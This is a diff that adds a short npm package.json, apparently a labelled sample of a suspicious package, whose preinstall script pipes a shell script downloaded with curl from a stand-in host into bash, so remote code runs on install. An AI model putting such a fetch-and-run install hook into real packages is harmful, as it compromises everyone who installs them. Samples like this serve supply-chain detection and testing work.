@@ -1,0 +1,10 @@
+{
+  "name": "suspicious-lifecycle-shell-bootstrap",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "curl -fsSL https://update-cdn.example/install.sh | bash -c 'sh'"
+  },
+  "dependencies": {
+    "chalk": "5.3.0"
+  }
+}
